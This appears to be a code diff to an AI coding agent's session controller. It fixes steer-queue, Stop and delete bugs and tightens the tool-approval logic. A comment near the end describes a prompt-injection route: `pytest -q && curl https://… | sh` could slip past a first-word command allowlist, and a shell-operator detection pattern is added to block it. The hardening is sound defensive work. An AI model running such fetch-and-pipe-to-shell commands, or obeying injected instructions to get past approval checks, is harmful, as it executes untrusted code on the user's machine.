@@ -5,7 +5,7 @@ import { request } from "undici";
 import type { Msg } from "../providers/client";
 import { runAgent } from "../agent/loop";
 import { isUntitled, titleFrom, sanitizeTitle } from "../core/sessions";
-import type { FileChange, ToolContext, TodoItem, ToolImage } from "../agent/tools";
+import type { ApprovalKind, FileChange, ToolContext, TodoItem, ToolImage } from "../agent/tools";
 import { mentionable } from "../agent/tools";
 import { agentAllowsMcp, agentRefusal } from "../agents/loader";
 import { parseQualified } from "../mcp/registry";
@@ -58,6 +58,10 @@ function chipsFor(
 interface PendingApproval {
   resolve: (allowed: boolean) => void;
   summary: string;
+  /** What is actually being asked for. See ApprovalKind in agent/tools.ts. */
+  kind: ApprovalKind;
+  /** The conversation waiting on the answer, so Stop can scope its denials. */
+  sessionId: string;
 }
 
 interface TurnDiffs {
@@ -88,6 +92,29 @@ interface LiveTurn {
   replay: ReplayableEvent[];
   /** Captured so a background turn can be saved under its own name. */
   title: string;
+  /**
+   * Messages typed while THIS turn runs, waiting to be injected at the next
+   * boundary between model calls.
+   *
+   * On the turn rather than on the controller, which is where they used to
+   * live. `detach()` cleared that shared array on every conversation switch,
+   * so a steered message the user had already been told was accepted -
+   * `inputAccepted` had been broadcast, the composer had cleared - was
+   * silently dropped the moment they looked at another chat. With two turns
+   * running it was worse: both drained the same queue, so a message typed
+   * into one conversation could be injected into the other.
+   */
+  steer: Msg[];
+  /**
+   * File chips for each pending steer, in the same order.
+   *
+   * Beside the messages rather than inside them because a `Msg` has nowhere to
+   * put a file name: an image is a content block with base64 in it, and a text
+   * attachment has already been folded into the prose.
+   */
+  steerFiles: AttachmentChipDto[][];
+  /** Drained with the messages, consumed one per `steer` event from the loop. */
+  steerFilesInFlight: AttachmentChipDto[][];
 }
 
 const PATCH_LIMIT = 30_000;
@@ -97,8 +124,15 @@ export class SessionController {
   sessionId: string;
   running = false;
 
-  /** Set by "Always allow" on a write or edit. Session-scoped by design. */
-  private alwaysAllowEdits = false;
+  /**
+   * Kinds the user has said "Always allow" to. Session-scoped by design.
+   *
+   * A set rather than the single `alwaysAllowEdits` boolean it replaces:
+   * that boolean was consulted for every request that was not a shell command,
+   * so one click on a file edit also granted browser scripting, network
+   * fetches and every MCP call until the conversation was reset.
+   */
+  private alwaysAllow = new Set<ApprovalKind>();
 
   /**
    * Every turn currently running, keyed by the conversation it belongs to.
@@ -312,28 +346,40 @@ export class SessionController {
     attachments?: Array<{ name: string; mediaType: string; data: string }>;
   }> = [];
   private queueSeq = 0;
-  private steer: Msg[] = [];
-  /**
-   * File chips for each pending steer, in the same order.
-   *
-   * Kept beside the messages rather than inside them because a `Msg` has
-   * nowhere to put a file name: an image is a content block with base64 in it
-   * and a text attachment has already been folded into the prose. The
-   * transcript still has to show the chip, so the names travel separately.
-   */
-  private steerFiles: AttachmentChipDto[][] = [];
-  /** Drained with the messages, consumed one per `steer` event from the loop. */
-  private steerFilesInFlight: AttachmentChipDto[][] = [];
 
-  /** Drained by the agent loop between model calls. */
-  private takeSteer = (): Msg[] => {
-    if (!this.steer.length) return [];
-    const out = this.steer;
-    this.steer = [];
-    this.steerFilesInFlight.push(...this.steerFiles);
-    this.steerFiles = [];
-    return out;
-  };
+  /** Drained by the agent loop between model calls, for one turn. */
+  private takeSteerFor(turn: LiveTurn): () => Msg[] {
+    return () => {
+      if (!turn.steer.length) return [];
+      const out = turn.steer;
+      turn.steer = [];
+      turn.steerFilesInFlight.push(...turn.steerFiles);
+      turn.steerFiles = [];
+      return out;
+    };
+  }
+
+  /**
+   * Add a message to the running turn's steer queue.
+   *
+   * Returns false when there is no turn to steer into, which is the caller's
+   * cue to send it as its own turn rather than putting it in a list nothing
+   * will ever drain.
+   */
+  private pushSteer(msg: Msg, chips: AttachmentChipDto[], text: string): boolean {
+    const turn = this.activeTurn();
+    if (!turn) return false;
+    turn.steer.push(msg);
+    turn.steerFiles.push(chips);
+    this.app.broadcast({
+      type: "inputAccepted",
+      mode: "steer",
+      text,
+      depth: turn.steer.length,
+      files: chips,
+    });
+    return true;
+  }
 
   /**
    * One user turn, built from the text and whatever was attached.
@@ -553,16 +599,12 @@ export class SessionController {
         const msg: Msg = profile
           ? this.composeUserMessage(text, attachments, profile)
           : { role: "user", content: text };
-        const chips = chipsFor(attachments);
-        this.steer.push(msg);
-        this.steerFiles.push(chips);
-        this.app.broadcast({
-          type: "inputAccepted",
-          mode: "steer",
-          text,
-          depth: this.steer.length,
-          files: chips,
-        });
+        // If the running turn is not in THIS conversation there is nothing on
+        // screen to steer, so the message queues instead of vanishing.
+        if (!this.pushSteer(msg, chipsFor(attachments), text)) {
+          this.queued.push({ id: `q${++this.queueSeq}`, text, attachments });
+          this.broadcastQueue();
+        }
       } else {
         this.queued.push({ id: `q${++this.queueSeq}`, text, attachments });
         this.broadcastQueue();
@@ -616,6 +658,9 @@ export class SessionController {
       history: this.history,
       replay: [],
       title: this.title,
+      steer: [],
+      steerFiles: [],
+      steerFilesInFlight: [],
     };
     this.live.set(turn.id, turn);
     // The history list marks a working conversation, so it is now stale.
@@ -787,9 +832,9 @@ export class SessionController {
       // Every path that can change the workspace is gated on approval, so this
       // is where the deferred snapshot is joined. By the time any tool writes,
       // the checkpoint it would be restored to already exists.
-      approve: async (summary, detail, patch) => {
+      approve: async (summary, detail, patch, kind) => {
         await snapshot;
-        return this.requestApproval(summary, detail, turn, patch);
+        return this.requestApproval(summary, detail, turn, patch, kind);
       },
       onFileTouched: (abs: string, change?: FileChange) => {
         const rel = path.relative(root, abs).split(path.sep).join("/");
@@ -819,7 +864,18 @@ export class SessionController {
         client,
         ctx,
         history: priorHistory,
-        userMessage: text,
+        // The COMPOSED message, not the raw text.
+        //
+        // This said `userMessage: text` while `userMsg` - the same sentence
+        // plus every attachment, every resolved `@` mention and the
+        // editor-context block - went into `turn.history` a few lines above.
+        // The loop builds its request from `history` (which is the snapshot
+        // taken BEFORE that push) and this field, so everything the user
+        // attached reached the model exactly one turn late, and the turn they
+        // attached it to answered the bare sentence. The chip was in the
+        // composer, the file was in the transcript, and the model had never
+        // seen it.
+        userMessage: userMsg,
         signal: turn.abort.signal,
         phase,
         mcpTools: this.app.agentMcpTools(),
@@ -835,7 +891,7 @@ export class SessionController {
         // produces them, so tool calls survive into the next turn's context and
         // into a restored session.
         onMessage: (m) => turn.history.push(m),
-        takeSteer: this.takeSteer,
+        takeSteer: this.takeSteerFor(turn),
       })) {
         switch (ev.type) {
           case "text": {
@@ -900,7 +956,11 @@ export class SessionController {
             // for. The panel gets the three parts separately; see ErrorOut.
             this.app.log("error",
               [ev.error, ev.errorDetail].filter(Boolean).join("\n") || "Unknown agent error.");
-            this.show(turn, {
+            // emit, not show: a failure has to survive a webview reload and
+            // has to be there when the user returns to a conversation that
+            // failed while they were reading another one. With `show` it was
+            // reported to nobody in both cases.
+            this.emit(turn, {
               type: "error",
               message: ev.error ?? "Unknown error.",
               fix: ev.errorFix,
@@ -918,7 +978,7 @@ export class SessionController {
             const out: ReplayableEvent = {
               type: "steerAccepted",
               text: ev.text ?? "",
-              files: this.steerFilesInFlight.shift() ?? [],
+              files: turn.steerFilesInFlight.shift() ?? [],
             };
             this.emit(turn, out);
             break;
@@ -930,7 +990,10 @@ export class SessionController {
     } catch (e) {
       errored = true;
       this.app.log("error", messageOf(e));
-      this.app.broadcast({
+      // Through the turn for the same reason as the yielded errors above: a
+      // background turn that throws must not report into whatever conversation
+      // happens to be on screen, and must still be there when the user returns.
+      this.emit(turn, {
         type: "error",
         message: messageOf(e),
         fix: fixOf(e),
@@ -945,7 +1008,7 @@ export class SessionController {
       // turn finished in the background has to have one to replay.
       if (body) this.emit(turn, { type: "streamDelta", text: body });
       if (steps.length) {
-        this.show(turn, {
+        this.emit(turn, {
           type: "planProposed",
           meta: `${steps.length} steps · read-only research done`,
           steps,
@@ -960,13 +1023,26 @@ export class SessionController {
       if (preHash) await this.emitDiffs(turnId, preHash, touched);
     }
 
-    this.live.delete(turn.id);
+    /* HAS THIS TURN BEEN REPLACED WHILE IT WAS UNWINDING?
+     *
+     * `interrupt()` removes the turn from `live` and clears `running` while
+     * this async function is still returning from the generator. The user can
+     * - and routinely does - retype and send immediately, which registers a
+     * NEW turn under the same conversation id. The unconditional delete below
+     * then removed THAT turn: `activeTurn()` went undefined, so Stop stopped
+     * working on a turn that was visibly streaming, `replayBuffer()` came back
+     * empty so a panel reload showed nothing, and the history list stopped
+     * marking the conversation as working. Interrupt-then-resend is the most
+     * ordinary gesture in a chat, and it left the panel in a state only a
+     * window reload could clear. */
+    const superseded = this.live.get(turn.id) !== turn;
+    if (!superseded) this.live.delete(turn.id);
     this.app.refreshSessions();
     // Only the conversation on screen gets its composer back. A turn that
     // finished in the background has nothing to say to the panel, which is
     // showing something else - it says it by leaving a full replay buffer
     // behind for whenever the user returns.
-    if (turn.id === this.sessionId) {
+    if (turn.id === this.sessionId && !superseded) {
       this.running = false;
       this.app.setRunning(false);
       this.app.broadcast({ type: "turnEnd" });
@@ -980,7 +1056,8 @@ export class SessionController {
     // Only when the user is still looking at this conversation. Queued text was
     // typed into the composer of the chat they have since left, and sending it
     // now would start a turn in a conversation they are not in.
-    const next = turn.id === this.sessionId ? this.queued.shift() : undefined;
+    const next =
+      turn.id === this.sessionId && !superseded ? this.queued.shift() : undefined;
     if (next) {
       // The tray loses the row before the turn starts, so the message is in
       // exactly one place at a time - queued, or in the transcript. It used to
@@ -1081,21 +1158,29 @@ export class SessionController {
    * Decide whether a side effect may proceed, escalating to the user only when
    * the configured mode requires it.
    */
-  requestApproval(summary: string, detail?: string, turn?: LiveTurn, patch?: string): Promise<boolean> {
+  requestApproval(
+    summary: string,
+    detail?: string,
+    turn?: LiveTurn,
+    patch?: string,
+    kind: ApprovalKind = "command"
+  ): Promise<boolean> {
     const mode = this.app.approvalMode();
-    const isCommand = summary.startsWith("Run:");
 
     if (mode === "full-auto") return Promise.resolve(true);
-    if (mode === "edits-auto" && !isCommand) return Promise.resolve(true);
-    if (!isCommand && this.alwaysAllowEdits) return Promise.resolve(true);
-    if (isCommand) {
-      const token = firstToken(summary);
+    // "edits-auto" means edits, and now only edits. It used to mean "anything
+    // that is not a shell command", which quietly included `browser eval`,
+    // fetch_url, web_search, image generation and every MCP call.
+    if (mode === "edits-auto" && kind === "edit") return Promise.resolve(true);
+    if (this.alwaysAllow.has(kind)) return Promise.resolve(true);
+    if (kind === "command") {
+      const token = allowlistToken(summary);
       if (token && this.app.alwaysAllowedCommands.includes(token)) return Promise.resolve(true);
     }
 
     const id = crypto.randomUUID();
     return new Promise<boolean>((resolve) => {
-      this.pending.set(id, { resolve, summary });
+      this.pending.set(id, { resolve, summary, kind, sessionId: turn?.id ?? this.sessionId });
       const ev: ReplayableEvent = { type: "permissionRequest", id, summary, detail, patch };
       // Through the turn when there is one, so a question asked by a
       // background turn is buffered rather than shown over a different
@@ -1112,11 +1197,24 @@ export class SessionController {
     this.pending.delete(id);
 
     if (decision === "always") {
-      if (entry.summary.startsWith("Run:")) {
-        const token = firstToken(entry.summary);
+      if (entry.kind === "command") {
+        const token = allowlistToken(entry.summary);
         if (token) await this.app.rememberAllowedCommand(token);
+        // A command with a pipeline, a redirect or a second command in it has
+        // no single token to remember, so "always" applies to this call only
+        // and the user is told rather than being left to assume it stuck.
+        else {
+          this.app.broadcast({
+            type: "error",
+            message: "That command was allowed once, not always.",
+            fix:
+              "Only a plain command can be remembered. This one contains a shell operator " +
+              "(a pipe, a redirect, ; or &&), and remembering its first word would allow " +
+              "every other command chained after it.",
+          });
+        }
       } else {
-        this.alwaysAllowEdits = true;
+        this.alwaysAllow.add(entry.kind);
       }
     }
 
@@ -1291,11 +1389,21 @@ export class SessionController {
     const turn = this.activeTurn();
     turn?.abort.abort();
     if (turn) this.live.delete(turn.id);
-    for (const [id, entry] of this.pending) {
+    /* ONLY THIS CONVERSATION'S QUESTIONS.
+     *
+     * `pending` is controller-wide, and this loop used to resolve every entry
+     * in it as denied. So pressing Stop in one chat refused, unseen and
+     * unanswerable, an edit a BACKGROUND turn in a different chat was waiting
+     * on - the exact thing `detach()` refuses to do three screens down,
+     * because "resolving them as denied would silently refuse an edit the user
+     * never saw asked". The comment above this method has always said Stop
+     * means "stop this, not everything I have running elsewhere"; now it does. */
+    for (const [id, entry] of [...this.pending]) {
+      if (entry.sessionId !== this.sessionId) continue;
       entry.resolve(false);
+      this.pending.delete(id);
       this.app.broadcast({ type: "permissionResolved", id, decision: "deny" });
     }
-    this.pending.clear();
     this.running = false;
     this.app.setRunning(false);
     this.app.broadcast({ type: "turnEnd" });
@@ -1337,6 +1445,10 @@ export class SessionController {
    */
   private persistTurn(turn: LiveTurn): void {
     if (!turn.history.length) return;
+    // Belt and braces beside `endTurnsFor`: a turn aborted by a delete can
+    // still be unwinding when it reaches here, and writing the file back would
+    // undo the delete.
+    if (this.app.sessions.wasDeleted(turn.id)) return;
     this.app.sessions.save(turn.id, turn.history, turn.title);
     if (turn.id === this.sessionId) void this.app.rememberSession(turn.id);
     this.app.refreshSessions();
@@ -1487,16 +1599,9 @@ export class SessionController {
     const msg: Msg = profile
       ? this.composeUserMessage(item.text, item.attachments, profile)
       : { role: "user", content: item.text };
-    const chips = chipsFor(item.attachments);
-    this.steer.push(msg);
-    this.steerFiles.push(chips);
-    this.app.broadcast({
-      type: "inputAccepted",
-      mode: "steer",
-      text: item.text,
-      depth: this.steer.length,
-      files: chips,
-    });
+    if (!this.pushSteer(msg, chipsFor(item.attachments), item.text)) {
+      void this.send(item.text, item.attachments);
+    }
   }
 
   /**
@@ -1540,7 +1645,7 @@ export class SessionController {
       this.history = [];
     }
     this.title = title;
-    this.alwaysAllowEdits = false;
+    this.alwaysAllow.clear();
     this.turnDiffs.clear();
     // The change list belongs to the conversation, so it leaves with it.
     this.changes.clear();
@@ -1607,12 +1712,38 @@ export class SessionController {
 
   /** Deleting the conversation in the composer drops you into a fresh one. */
   deleteSession(id: string): void {
+    /* A DELETED CONVERSATION MUST NOT COME BACK.
+     *
+     * The turn running in it was left alone, so it kept going, and
+     * `persistTurn` wrote the transcript out again when it finished - under
+     * the id that had just been deleted. The chat reappeared in the history
+     * list a minute after the user removed it. And if that turn was blocked on
+     * an approval, the question now had no surface that could answer it: the
+     * conversation was unreachable, the promise never resolved, `runTool`
+     * never returned, and the LiveTurn sat in `live` for the life of the
+     * window. Ending it is the only honest reading of "delete this". */
+    this.endTurnsFor(id);
     this.app.sessions.delete(id);
     if (id !== this.sessionId) {
       this.app.refreshSessions();
       return;
     }
     this.reset(true, this.app.sessions.nextUntitled());
+  }
+
+  /** Abort a conversation's turn and answer anything it is waiting on. */
+  private endTurnsFor(id: string): void {
+    const turn = this.live.get(id);
+    if (turn) {
+      turn.abort.abort();
+      this.live.delete(id);
+    }
+    for (const [pid, entry] of [...this.pending]) {
+      if (entry.sessionId !== id) continue;
+      entry.resolve(false);
+      this.pending.delete(pid);
+      this.app.broadcast({ type: "permissionResolved", id: pid, decision: "deny" });
+    }
   }
 
   /**
@@ -1631,9 +1762,10 @@ export class SessionController {
    */
   private detach(): void {
     this.running = false;
-    this.steer = [];
-    this.steerFiles = [];
-    this.steerFilesInFlight = [];
+    // The steer queue is NOT cleared here any more: it belongs to the turn, and
+    // the turn is still running. Clearing a controller-wide array here threw
+    // away messages the user had already been told were accepted, the moment
+    // they glanced at another conversation.
     this.app.setRunning(false);
   }
 
@@ -1690,11 +1822,38 @@ export function extractPlan(raw: string): { body: string; steps: string[] } {
   return { body, steps };
 }
 
-/** `Run: pytest -q` → `pytest`. Used for per-workspace command allow-listing. */
-function firstToken(summary: string): string | undefined {
+/**
+ * Shell syntax that makes the first word of a command a lie about what runs.
+ *
+ * `;` `&` `|` newline chain a second command. `` ` `` and `$(` substitute one.
+ * `>` `<` redirect. Any of them and the command is no longer "pytest with some
+ * arguments", it is pytest AND whatever else the model wrote.
+ */
+const SHELL_OPERATORS = /[;&|<>\n\r`]|\$\(/;
+
+/**
+ * `Run: pytest -q` → `pytest`. Used for per-workspace command allow-listing.
+ *
+ * THE FIRST WORD IS ONLY THE COMMAND WHEN THERE IS ONLY ONE COMMAND.
+ *
+ * This used to be `command.split(/\s+/)[0]`, unconditionally. A user who once
+ * clicked "Always allow" on `pytest -q` had, from then on and across restarts,
+ * granted silent execution of anything whose first word was `pytest` -
+ * including `pytest -q && curl https://…​ | sh`, which is a single prompt
+ * injection away in any file the agent reads. The allowlist is stored per
+ * workspace and survives reloads, so the grant outlived the session that made
+ * it and nothing on screen ever mentioned it again.
+ *
+ * A command containing a shell operator is now unrememberable: it can be
+ * approved, once, by the person reading it.
+ */
+export function allowlistToken(summary: string): string | undefined {
   const command = summary.replace(/^Run:\s*/, "").trim();
+  if (!command || SHELL_OPERATORS.test(command)) return undefined;
   const token = command.split(/\s+/)[0];
-  return token || undefined;
+  // A token that is itself a path or an assignment is not a command name.
+  if (!token || /[/\\=]/.test(token)) return undefined;
+  return token;
 }
 
 function messageOf(e: unknown): string {
